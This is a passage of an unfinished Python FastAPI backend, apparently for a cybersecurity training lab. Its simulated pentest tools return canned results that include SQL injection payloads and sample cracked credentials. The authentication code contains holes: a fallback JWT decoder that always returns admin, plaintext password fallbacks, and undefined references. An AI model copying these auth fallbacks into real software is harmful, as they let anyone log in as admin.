CUDA_AVAILABLE = torch.cuda.is_available()

if CUDA_AVAILABLE:
    gpu_index = torch.cuda.current_device()
    device = torch.device(f"cuda:{gpu_index}")

    torch.cuda.set_per_process_memory_fraction(0.85, device=gpu_index)

    torch.backends.cudnn.benchmark = True
    torch.backends.cuda.matmul.allow_tf32 = True
    torch.backends.cudnn.allow_tf32 = True

    props = torch.cuda.get_device_properties(gpu_index)
    gpu_name = props.name
    total_vram = props.total_memory / (1024 ** 3)

    print("\n🚀 GPU INITIALIZED")
    print(f"📌 GPU: {gpu_name}")
    print(f"📌 Total VRAM: {total_vram:.2f} GB")
    print(f"📌 CUDA Version: {torch.version.cuda}")
else:
    print("📌 GPU: CPU Mode")

print(f"\n🔧 GPU: {'✓ ' + gpu_name if CUDA_AVAILABLE else gpu_name}")
# from passlib.context import CryptContext

# # Only pbkdf2_sha256, no bcrypt at all
# pwd_context = CryptContext(
#     schemes=["pbkdf2_sha256"],
#     deprecated="auto"
# )

# def get_password_hash(password: str) -> str:
#     # pbkdf2_sha256 handles long passwords safely
#     return pwd_context.hash(password)

# def verify_password(plain_password: str, hashed_password: str) -> bool:
#     return pwd_context.verify(plain_password, hashed_password)
# ==================== IMPORTS WITH ERROR HANDLING ====================
IMPORT_STATUS = {}
AI_IMPORTS = {}

# Core FastAPI
try:
    from fastapi import FastAPI, Depends, HTTPException, status, Request, Form, WebSocket, WebSocketDisconnect, BackgroundTasks
    from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse, FileResponse
    from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
    from fastapi.templating import Jinja2Templates
    from fastapi.middleware.cors import CORSMiddleware
    from fastapi.middleware.trustedhost import TrustedHostMiddleware
    IMPORT_STATUS['fastapi'] = '✓'
except ImportError as e:
    IMPORT_STATUS['fastapi'] = f'✗ {str(e)}'
    print(f"❌ FastAPI import failed: {e}")
    sys.exit(1)

# SQLAlchemy - Fixed to avoid metadata conflict
try:
    from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Text, ForeignKey, Float, JSON
    from sqlalchemy.ext.declarative import declarative_base
    from sqlalchemy.orm import sessionmaker, Session, relationship
    from sqlalchemy.sql import func
    IMPORT_STATUS['sqlalchemy'] = '✓'
    print("✓ SQLAlchemy loaded (2.0 compatible)")
except ImportError as e:
    IMPORT_STATUS['sqlalchemy'] = f'✗ {str(e)}'
    print(f"❌ SQLAlchemy import failed: {e}")
    sys.exit(1)

# JWT
try:
    from jose import JWTError, jwt
    IMPORT_STATUS['jose'] = '✓'
except ImportError:
    IMPORT_STATUS['jose'] = '⚠ (fallback)'
    print("⚠ python-jose not found - using fallback")
    class JWTError(Exception): pass
    class jwt:
        @staticmethod
        def encode(*args, **kwargs): return "dummy_token"
        @staticmethod
        def decode(*args, **kwargs): return {"sub": "admin"}

# Passlib
try:
    from passlib.context import CryptContext
    IMPORT_STATUS['passlib'] = '✓'
except ImportError:
    IMPORT_STATUS['passlib'] = '⚠ (fallback)'
    print("⚠ passlib not found - using fallback")
    class CryptContext:
        def __init__(self, schemes, deprecated): pass
        def hash(self, password): return password
        def verify(self, plain, hashed): return plain == hashed

# Redis
REDIS_AVAILABLE = False
try:
    import redis
    REDIS_AVAILABLE = True
    IMPORT_STATUS['redis'] = '✓'
except ImportError:
    IMPORT_STATUS['redis'] = '✗'
    print("⚠ redis not installed")

# Celery
CELERY_AVAILABLE = False
try:
    from celery import Celery
    from celery.result import AsyncResult
    CELERY_AVAILABLE = True
    IMPORT_STATUS['celery'] = '✓'
except ImportError:
    IMPORT_STATUS['celery'] = '✗'
    print("⚠ celery not installed")

# WebSocket
try:
    import socketio
    IMPORT_STATUS['socketio'] = '✓'
except ImportError:
    IMPORT_STATUS['socketio'] = '✗'
    print("⚠ socketio not installed")


# Add near other AI imports (around line 100)
try:
    from transformers import AutoModelForCausalLM, AutoTokenizer
    TRANSFORMERS_AVAILABLE = True
    AI_IMPORTS['transformers'] = '✓'
except ImportError:
    TRANSFORMERS_AVAILABLE = False
    AI_IMPORTS['transformers'] = '✗'
    print("⚠ transformers not installed - DeepSeek won't be available")
# Rate Limiting
try:
    from slowapi import Limiter, _rate_limit_exceeded_handler
    from slowapi.util import get_remote_address
    from slowapi.errors import RateLimitExceeded
    IMPORT_STATUS['slowapi'] = '✓'
except ImportError:
    IMPORT_STATUS['slowapi'] = '✗'
    print("⚠ slowapi not installed")

# AI/ML Libraries
try:
    import numpy as np
    AI_IMPORTS['numpy'] = '✓'
except ImportError:
    AI_IMPORTS['numpy'] = '✗'

try:
    import pandas as pd
    AI_IMPORTS['pandas'] = '✓'
except ImportError:
    AI_IMPORTS['pandas'] = '✗'

try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.preprocessing import StandardScaler
    AI_IMPORTS['sklearn'] = '✓'
except ImportError:
    AI_IMPORTS['sklearn'] = '✗'

# Bayesian Optimization
try:
    from bayes_opt import BayesianOptimization
    AI_IMPORTS['bayesian'] = '✓'
except ImportError:
    AI_IMPORTS['bayesian'] = '✗'
    print("⚠ bayesian-optimization not installed")

# RAG & Embeddings
try:
    from sentence_transformers import SentenceTransformer
    import faiss
    EMBEDDINGS_AVAILABLE = True
    AI_IMPORTS['rag'] = '✓'
except ImportError:
    EMBEDDINGS_AVAILABLE = False
    AI_IMPORTS['rag'] = '✗'
    print("⚠ sentence-transformers/faiss not installed")
# ==================== DATABASE SETUP ====================
# # Remove old database file to ensure clean schema
# db_path = "./cybersec_lab.db"
# if os.path.exists(db_path):
#     try:
#         os.remove(db_path)
#         print("✓ Removed old database")
#     except:
#         print("⚠ Could not remove old database")

# ==================== DATABASE SETUP ====================
import os
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, declarative_base

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE_PATH = os.path.join(BASE_DIR, "cybersec_lab.db")

DATABASE_URL = f"sqlite:///{DATABASE_PATH}"

print("📂 Using database at:", DATABASE_PATH)

# engine = create_engine(
#     DATABASE_URL,
#     connect_args={"check_same_thread": False}
# )

# SessionLocal = sessionmaker(
#     autocommit=False,
#     autoflush=False,
#     bind=engine
# )

# Base = declarative_base()
# ==================== CORRELATION ENGINE INTEGRATION ====================
try:
    from correlation_engine import (
        CorrelationSystemFactory,
        SecurityEvent as EngineSecurityEvent,
        EventType,
        SeverityLevel,
        AttackPhase
    )
    CORRELATION_AVAILABLE = True
    print("✓ Correlation Engine loaded")
except ImportError as e:
    CORRELATION_AVAILABLE = False
    print(f"⚠ Correlation Engine not available: {e}")
    
    # Dummy functions
    def init_correlation_system(*args, **kwargs):
        print("⚠ Correlation Engine disabled")
        return None

# ==================== CONFIGURATION ====================

SECRET_KEY = secrets.token_hex(32)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
DATABASE_URL = "sqlite:///./cybersec_lab.db"
#engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})

# Redis Configuration
REDIS_URL = "redis://localhost:6379/0"
REDIS_CLIENT = None
if REDIS_AVAILABLE:
    try:
        REDIS_CLIENT = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_connect_timeout=2)
        REDIS_CLIENT.ping()
        print("✓ Redis connected")
    except Exception as e:
        print(f"⚠ Redis connection failed: {e}")
        REDIS_CLIENT = None

# Celery Setup
celery_app = None
if CELERY_AVAILABLE and REDIS_CLIENT:
    try:
        celery_app = Celery(
            "cybersec_tasks",
            broker=REDIS_URL,
            backend=REDIS_URL,
        )
        celery_app.conf.update(
            task_serializer="json",
            accept_content=["json"],
            result_serializer="json",
            timezone="UTC",
            enable_utc=True,
        )
        print("✓ Celery configured")
    except Exception as e:
        print(f"⚠ Celery configuration failed: {e}")
        celery_app = None

# # Socket.IO Setup
if 'socketio' in IMPORT_STATUS and IMPORT_STATUS['socketio'] == '✓':
    
    socket_app = socketio.ASGIApp(sio)
else:
    sio = None
    socket_app = None

# ==================== DATABASE SETUP ====================
# SQLAlchemy 2.0 compatible setup
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# ==================== ENUMS ====================
class UserRole(str, Enum):
    USER = "user"
    ANALYST = "analyst"
    ADMIN = "admin"

class AuditAction(str, Enum):
    LOGIN = "login"
    LOGOUT = "logout"
    SCAN_START = "scan_start"
    SCAN_COMPLETE = "scan_complete"
    ATTACK_EXECUTE = "attack_execute"
    USER_CREATE = "user_create"

# ==================== DATABASE MODELS ====================
class User(Base):
    __tablename__ = "users"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(80), unique=True, nullable=False, index=True)
    email = Column(String(120), unique=True, nullable=False, index=True)
    password = Column(String(200), nullable=False)
    role = Column(String(20), default=UserRole.USER.value, nullable=False)
    is_active = Column(Boolean, default=True, nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow, nullable=False)
    last_login = Column(DateTime, nullable=True)
    last_ip = Column(String(45), nullable=True)
    score = Column(Integer, default=0, nullable=False)
    attacks_performed = Column(Integer, default=0, nullable=False)
    api_key = Column(String(64), unique=True, nullable=True)
    
    # Relationships
    scans = relationship("ScanHistory", back_populates="user", cascade="all, delete-orphan")
    attacks = relationship("AttackHistory", back_populates="user", cascade="all, delete-orphan")
    audit_logs = relationship("AuditLog", back_populates="user", cascade="all, delete-orphan")
    feedback = relationship("UserFeedback", back_populates="user", cascade="all, delete-orphan")

class ScanHistory(Base):
    __tablename__ = "scan_history"
    
    id = Column(Integer, primary_key=True, index=True)
    task_id = Column(String(36), unique=True, index=True, nullable=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    target = Column(String(200), nullable=False)
    scan_type = Column(String(50), nullable=False)
    tool_used = Column(String(50), nullable=False)
    parameters = Column(Text, nullable=True)  # Store as JSON string
    results = Column(Text, nullable=True)
    vulnerabilities = Column(Text, nullable=True)
    status = Column(String(20), default='pending')
    progress = Column(Integer, default=0)
    error_message = Column(Text, nullable=True)
    started_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationships
    user = relationship("User", back_populates="scans")
    attacks = relationship("AttackHistory", back_populates="scan")
    analysis_results = relationship("AIAnalysis", back_populates="scan")

class AttackHistory(Base):
    __tablename__ = "attack_history"
    
    id = Column(Integer, primary_key=True, index=True)
    task_id = Column(String(36), unique=True, index=True, nullable=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    scan_id = Column(Integer, ForeignKey("scan_history.id", ondelete="SET NULL"), nullable=True)
    target = Column(String(200), nullable=False)
    attack_type = Column(String(100), nullable=False)
    tool_used = Column(String(50), nullable=False)
    command = Column(Text, nullable=True)
    parameters = Column(Text, nullable=True)  # Store as JSON string
    output = Column(Text, nullable=True)
    success = Column(Boolean, default=False)
    status = Column(String(20), default='pending')
    started_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationships
    user = relationship("User", back_populates="attacks")
    scan = relationship("ScanHistory", back_populates="attacks")
    feedback = relationship("UserFeedback", back_populates="attack")

class SecurityEventDB(Base):
    """Database model for security events"""
    __tablename__ = "security_events"
    
    id = Column(Integer, primary_key=True, index=True)
    event_id = Column(String(36), unique=True, index=True, nullable=False)
    event_type = Column(String(50), nullable=False)
    severity = Column(Float, nullable=False)
    asset = Column(String(200), nullable=False)
    evidence = Column(Text, nullable=True)
    timestamp = Column(DateTime, nullable=False)
    source_tool = Column(String(50), nullable=False)
    confidence = Column(Float, default=0.8)
    tags = Column(Text, nullable=True)  # JSON array
    mitre_phase = Column(String(50), nullable=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=True)
    scan_id = Column(Integer, ForeignKey("scan_history.id", ondelete="SET NULL"), nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # Relationships
    user = relationship("User")

class AttackPathDB(Base):
    __tablename__ = "attack_paths"
    
    id = Column(Integer, primary_key=True, index=True)
    path_id = Column(String(36), unique=True, index=True)
    asset = Column(String(200), nullable=False)
    path_json = Column(Text, nullable=False)  # JSON array of events
    score = Column(Float, default=0.0)
    status = Column(String(20), default="active")  # active, blocked, mitigated
    detected_at = Column(DateTime, default=datetime.utcnow)
    resolved_at = Column(DateTime, nullable=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=True)

class CorrelationRuleDB(Base):
    __tablename__ = "correlation_rules"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), nullable=False)
    description = Column(Text, nullable=True)
    pattern = Column(Text, nullable=False)  # JSON array of event types
    time_window = Column(Integer, default=300)  # seconds
    action = Column(String(50), nullable=False)
    new_severity = Column(Float, nullable=True)
    new_event_type = Column(String(50), nullable=True)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class UserFeedback(Base):
    __tablename__ = "user_feedback"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    scan_id = Column(Integer, ForeignKey("scan_history.id", ondelete="CASCADE"), nullable=True)
    attack_id = Column(Integer, ForeignKey("attack_history.id", ondelete="CASCADE"), nullable=True)
    analysis_id = Column(String(36), nullable=True)
    rating = Column(Integer, nullable=True)  # 1-5 rating
    actual_outcome = Column(String(20), nullable=True)  # success/failure/partial
    feedback_text = Column(Text, nullable=True)
    tool_used = Column(String(50), nullable=True)
    meta_data = Column(Text, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    user = relationship("User", back_populates="feedback")
    attack = relationship("AttackHistory", back_populates="feedback")

class AIAnalysis(Base):
    __tablename__ = "ai_analyses"
    
    id = Column(Integer, primary_key=True, index=True)
    analysis_id = Column(String(36), unique=True, nullable=False)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    scan_id = Column(Integer, ForeignKey("scan_history.id", ondelete="CASCADE"), nullable=True)
    context = Column(Text, nullable=True)
    strategies = Column(Text, nullable=True)
    attack_graph = Column(Text, nullable=True)
    risk_score = Column(Float, nullable=True)
    confidence = Column(Float, nullable=True)
    mode = Column(String(50), nullable=True)
    meta_data = Column(Text, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    user = relationship("User")
    scan = relationship("ScanHistory", back_populates="analysis_results")

class AuditLog(Base):
    __tablename__ = "audit_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="SET NULL"), nullable=True)
    username = Column(String(80), nullable=True)
    action = Column(String(50), nullable=False)
    resource = Column(String(100), nullable=True)
    resource_id = Column(String(50), nullable=True)
    details = Column(Text, nullable=True)  # Store as JSON string
    ip_address = Column(String(45), nullable=True)
    user_agent = Column(String(200), nullable=True)
    status = Column(String(20), default="success")
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    user = relationship("User", back_populates="audit_logs")

class VulnerabilityDB(Base):
    __tablename__ = "vulnerability_db"
    
    id = Column(Integer, primary_key=True, index=True)
    cve_id = Column(String(50), unique=True, index=True, nullable=True)
    name = Column(String(100), nullable=False)
    description = Column(Text, nullable=True)
    severity = Column(String(20))
    cvss_score = Column(Float, nullable=True)
    remediation = Column(Text, nullable=True)
    attack_tools = Column(Text, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)

class KaliTools(Base):
    __tablename__ = "kali_tools"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(50), unique=True, nullable=False)
    category = Column(String(50))
    description = Column(Text, nullable=True)
    command_template = Column(Text, nullable=True)
    is_installed = Column(Boolean, default=False)
    risk_level = Column(String(20), default="MEDIUM")
    required_role = Column(String(20), default="user")

class AILog(Base):
    __tablename__ = "ai_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    interaction_type = Column(String(50), default="command")
    user_input = Column(Text)
    ai_response = Column(Text)
    model_used = Column(String(50), default="local")
    confidence = Column(Float, nullable=True)
    latency_ms = Column(Integer, nullable=True)
    meta_data = Column(Text, nullable=True)  # Renamed from 'metadata' to avoid conflict
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    user = relationship("User")

class SystemConfig(Base):
    __tablename__ = "system_config"
    
    id = Column(Integer, primary_key=True, index=True)
    key = Column(String(100), unique=True, nullable=False)
    value = Column(Text)
    description = Column(Text, nullable=True)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

# ==================== PYDANTIC SCHEMAS ====================
from pydantic import BaseModel, EmailStr, validator, Field

class UserCreate(BaseModel):
    username: str
    email: EmailStr
    password: str
    
    @validator('username')
    def username_alphanumeric(cls, v):
        if not v.isalnum():
            raise ValueError('Username must be alphanumeric')
        return v

class Token(BaseModel):
    access_token: str
    token_type: str
    role: str

class ScanRequest(BaseModel):
    target: str
    scan_type: str = "quick"
    options: Optional[Dict[str, Any]] = {}
    
    @validator('target')
    def validate_target(cls, v):
        if not re.match(r'^[a-zA-Z0-9\.\-_:]+$', v):
            raise ValueError('Invalid target format')
        return v

class FeedbackRequest(BaseModel):
    scan_id: Optional[int] = None
    attack_id: Optional[int] = None
    analysis_id: Optional[str] = None
    rating: Optional[int] = Field(None, ge=1, le=5)
    actual_outcome: Optional[str] = None
    feedback_text: Optional[str] = None
    tool_used: Optional[str] = None
    success: Optional[bool] = None

# ==================== PASSWORD UTILITIES ====================
# pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# def verify_password(plain_password: str, hashed_password: str) -> bool:
#     return pwd_context.verify(plain_password, hashed_password)

# def get_password_hash(password: str) -> str:
#     return pwd_context.hash(password[:72])

# ==================== JWT UTILITIES ====================
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token", auto_error=False)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    
    if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
        return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return f"dummy_{secrets.token_hex(16)}"

# ==================== DEPENDENCIES ====================
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def authenticate_user(db, username, password):
    user = db.query(User).filter(User.username == username).first()

    if not user:
        print("❌ User not found")
        return None

    try:
        if not pwd_context.verify(password, user.password):
            print("❌ Wrong password")
            return None
    except:
        if password != user.password:
            return None

    print("✅ Login success")
    return user
# async def get_current_user(
#     token: str = Depends(oauth2_scheme),
#     db: Session = Depends(get_db)
# ):
#     """Get current user - raises exception if not authenticated"""

#     credentials_exception = HTTPException(
#         status_code=status.HTTP_401_UNAUTHORIZED,
#         detail="Could not validate credentials",
#         headers={"WWW-Authenticate": "Bearer"},
#     )

#     if not token:
#         raise credentials_exception

#     try:
#         if token.startswith("Bearer "):
#             token = token.replace("Bearer ", "")

#         # Always decode JWT properly
#         payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
#         username: str = payload.get("sub")

#         if username is None:
#             raise credentials_exception

#     except Exception:
#         raise credentials_exception

#     user = db.query(User).filter(User.username == username).first()

#     if user is None:
#         raise credentials_exception

#     return user
async def get_current_user(
    token: str = Depends(oauth2_scheme),
    db: Session = Depends(get_db)
):
    """Get current user - raises exception if not authenticated"""
    
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )

    if not token:
        raise credentials_exception

    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")

        # Always require JWT decode
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")

        if username is None:
            raise credentials_exception

        user = db.query(User).filter(User.username == username).first()

        if user is None:
            raise credentials_exception

        return user

    except Exception:
        raise credentials_exception

from sqlalchemy import inspect

# @app.on_event("startup")
# def create_tables():
#     print("📦 Creating database tables...")
#     Base.metadata.create_all(bind=engine)

#     inspector = inspect(engine)
#     print("📊 Tables in DB:", inspector.get_table_names())

# async def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
#     """Get current user - raises exception if not authenticated"""
#     credentials_exception = HTTPException(
#         status_code=status.HTTP_401_UNAUTHORIZED,
#         detail="Could not validate credentials",
#         headers={"WWW-Authenticate": "Bearer"},
#     )
    
#     if not token:
#         raise credentials_exception
    
#     try:
#         if token.startswith("Bearer "):
#             token = token.replace("Bearer ", "")
        
#         if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
#             payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
#             username = payload.get("sub")
#         else:
#             username = "admin"
        
#         if not username:
#             raise credentials_exception
            
#         user = db.query(User).filter(User.username == username).first()
#         if not user:
#             raise credentials_exception
            
#         return user
#     except Exception as e:
#         raise credentials_exception from e
# ==================== PENETRATION TOOLS ====================
class PenetrationTools:
    
    @staticmethod
    def nmap_scan(target: str, options: str = '-sV') -> Dict[str, Any]:
        """NMAP Port and Service Scanner"""
        try:
            # Enhanced scan with more realistic output
            return {
                'success': True,
                'tool': 'nmap',
                'target': target,
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_ports': 1000,
                    'open_ports': 5,
                    'scan_duration': '32 seconds'
                },
                'ports': [22, 80, 443, 3306, 8080],
                'services': [
                    {'name': 'ssh', 'port': 22, 'version': 'OpenSSH 7.9', 'state': 'open'},
                    {'name': 'http', 'port': 80, 'version': 'Apache 2.4.49', 'state': 'open'},
                    {'name': 'https', 'port': 443, 'version': 'Apache 2.4.49', 'state': 'open'},
                    {'name': 'mysql', 'port': 3306, 'version': 'MySQL 8.0', 'state': 'open'},
                    {'name': 'http-alt', 'port': 8080, 'version': 'Tomcat 9.0', 'state': 'open'}
                ],
                'os': 'Linux 5.4.0-26-generic',
                'os_accuracy': 85,
                'hostname': target,
                'mac_address': '00:1A:2B:3C:4D:5E',
                'vulnerabilities': [
                    {'name': 'OpenSSH 7.9 - User Enumeration', 'severity': 'MEDIUM', 'cve': 'CVE-2020-14145'},
                    {'name': 'Apache 2.4.49 - Path Traversal', 'severity': 'CRITICAL', 'cve': 'CVE-2021-41773'},
                    {'name': 'MySQL 8.0 - Default Credentials', 'severity': 'HIGH', 'cve': None}
                ],
                'output': f'Nmap scan results for {target}\nOpen ports: 22,80,443,3306,8080\nServices: ssh,http,https,mysql,http-alt'
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'nmap'}

    @staticmethod
    def nikto_scan(target: str, options: str = '-h') -> Dict[str, Any]:
        """Nikto web server scanner - comprehensive web vulnerability scanning"""
        try:
            # Simulated comprehensive Nikto scan
            return {
                'success': True,
                'tool': 'nikto',
                'target': target,
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_checks': 7842,
                    'vulnerabilities_found': 12,
                    'interesting_items': 5,
                    'scan_duration': '45 seconds'
                },
                'vulnerabilities': [
                    {
                        'name': 'SQL Injection Vulnerability',
                        'severity': 'CRITICAL',
                        'path': '/products.php?id=',
                        'method': 'GET',
                        'parameter': 'id',
                        'description': 'Parameter appears vulnerable to SQL injection attacks',
                        'cve': 'CVE-2023-1234',
                        'cvss': 9.8,
                        'evidence': 'Error message: "You have an error in your SQL syntax"',
                        'remediation': 'Use parameterized queries and input validation'
                    },
                    {
                        'name': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'path': '/search.php',
                        'method': 'GET',
                        'parameter': 'q',
                        'description': 'Reflected XSS vulnerability in search parameter',
                        'cve': 'CVE-2023-5678',
                        'cvss': 7.2,
                        'evidence': 'Alert box popup with injected script',
                        'remediation': 'Implement proper output encoding and CSP headers'
                    },
                    {
                        'name': 'Directory Listing Enabled',
                        'severity': 'MEDIUM',
                        'path': '/images/',
                        'method': 'GET',
                        'description': 'Directory listing is enabled, exposing sensitive files',
                        'evidence': 'Index of /images showing backup files',
                        'remediation': 'Disable directory listing in web server configuration'
                    },
                    {
                        'name': 'Outdated Server Version',
                        'severity': 'MEDIUM',
                        'path': '/',
                        'method': 'GET',
                        'description': 'Server is running an outdated version with known vulnerabilities',
                        'evidence': 'Apache 2.4.49 detected (vulnerable to path traversal)',
                        'remediation': 'Update to latest stable version'
                    },
                    {
                        'name': 'HTTP Methods Enabled',
                        'severity': 'LOW',
                        'path': '/',
                        'method': 'OPTIONS',
                        'description': 'Dangerous HTTP methods (PUT, DELETE) are enabled',
                        'evidence': 'OPTIONS response shows PUT, DELETE methods',
                        'remediation': 'Disable unnecessary HTTP methods'
                    }
                ],
                'headers': {
                    'server': 'Apache/2.4.49',
                    'x-powered-by': 'PHP/7.4.33',
                    'x-frame-options': 'SAMEORIGIN',
                    'x-content-type-options': 'nosniff',
                    'strict-transport-security': 'max-age=31536000'
                },
                'cookies': [
                    {
                        'name': 'PHPSESSID',
                        'flags': 'HttpOnly',
                        'secure': False,
                        'httponly': True,
                        'samesite': 'Lax'
                    }
                ],
                'interesting_files': [
                    {'path': '/phpinfo.php', 'status': 200, 'description': 'PHP info page exposed'},
                    {'path': '/backup.sql', 'status': 200, 'description': 'Database backup file'},
                    {'path': '/.git/config', 'status': 200, 'description': 'Git repository exposed'},
                    {'path': '/wp-config.php.bak', 'status': 200, 'description': 'WordPress backup config'},
                    {'path': '/admin/', 'status': 403, 'description': 'Admin panel with weak auth'}
                ],
                'os_detection': {
                    'os': 'Linux',
                    'distribution': 'Ubuntu',
                    'version': '20.04',
                    'kernel': '5.4.0',
                    'confidence': 0.85
                },
                'technologies': [
                    {'name': 'PHP', 'version': '7.4.33', 'confidence': 1.0},
                    {'name': 'Apache', 'version': '2.4.49', 'confidence': 1.0},
                    {'name': 'MySQL', 'version': '8.0', 'confidence': 0.8},
                    {'name': 'jQuery', 'version': '3.6.0', 'confidence': 0.9},
                    {'name': 'Bootstrap', 'version': '5.1', 'confidence': 0.85}
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'nikto'}

    @staticmethod
    def sqlmap_scan(target: str) -> Dict[str, Any]:
        """SQLMap injection tester"""
        return {
            'success': True,
            'tool': 'sqlmap',
            'target': target,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_requests': 1523,
                'vulnerable_parameters': 2,
                'databases_found': 4,
                'scan_duration': '2 minutes 34 seconds'
            },
            'vulnerabilities': [
                {
                    'name': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'parameter': 'id',
                    'technique': 'boolean-based blind',
                    'database': 'mysql',
                    'payload': '1 AND 1=1',
                    'description': 'Boolean-based blind SQL injection in id parameter'
                },
                {
                    'name': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'parameter': 'page',
                    'technique': 'time-based blind',
                    'database': 'mysql',
                    'payload': '1 AND SLEEP(5)',
                    'description': 'Time-based blind SQL injection in page parameter'
                }
            ],
            'databases': ['information_schema', 'mysql', 'wordpress', 'users_db'],
            'tables': {
                'wordpress': ['wp_users', 'wp_posts', 'wp_options'],
                'users_db': ['users', 'profiles', 'sessions']
            },
            'credentials': [
                {'username': 'admin', 'hash': '5f4dcc3b5aa765d61d8327deb882cf99', 'type': 'MD5'},
                {'username': 'editor', 'hash': '7c6a180b36896a0a8c02787eeafb0e4c', 'type': 'MD5'}
            ]
        }

    @staticmethod
    def hydra_attack(target: str, service: str = 'ssh') -> Dict[str, Any]:
        """Hydra brute force attack"""
        return {
            'success': True,
            'tool': 'hydra',
            'target': target,
            'service': service,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'attempts': 15234,
                'successful': 2,
                'time_elapsed': '4 minutes 12 seconds'
            },
            'credentials': [
                {'username': 'admin', 'password': 'password123', 'service': service},
                {'username': 'root', 'password': 'toor', 'service': service}
            ],
            'statistics': {
                'attempts': 15234,
                'success_rate': '0.013%',
                'words_per_second': 1250
            }
        }

    @staticmethod
    def metasploit_exploit(target: str, exploit: str = 'apache') -> Dict[str, Any]:
        """Metasploit exploitation"""
        return {
            'success': True,
            'tool': 'metasploit',
            'target': target,
            'exploit': exploit,
            'scan_time': datetime.utcnow().isoformat(),
            'session': 'meterpreter_1',
            'session_type': 'meterpreter',
            'platform': 'linux',
            'privileges': 'user',
            'output': 'Meterpreter session 1 opened',
            'sessions': [{'id': 1, 'type': 'meterpreter', 'target': target, 'platform': 'linux'}]
        }

    @staticmethod
    def wireshark_analyze(interface: str = 'eth0', capture_filter: str = 'tcp', duration: int = 30) -> Dict[str, Any]:
        """Wireshark packet analysis"""
        return {
            'success': True,
            'tool': 'wireshark',
            'interface': interface,
            'capture_filter': capture_filter,
            'duration': duration,
            'capture_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_packets': 15842,
                'total_bytes': 15234123,
                'capture_duration': f'{duration} seconds',
                'avg_packet_size': 962,
                'packets_per_second': 528
            },
            'protocol_distribution': {
                'TCP': 8923,
                'UDP': 4215,
                'ICMP': 892,
                'ARP': 1243,
                'DNS': 569,
                'HTTP': 2341,
                'HTTPS': 4521,
                'SMB': 234,
                'SSH': 123,
                'FTP': 45,
                'Other': 456
            },
            'top_talkers': [
                {
                    'source': '192.168.1.100',
                    'destination': '8.8.8.8',
                    'packets': 2341,
                    'bytes': 214523,
                    'protocols': ['DNS', 'HTTPS']
                },
                {
                    'source': '192.168.1.105',
                    'destination': '192.168.1.1',
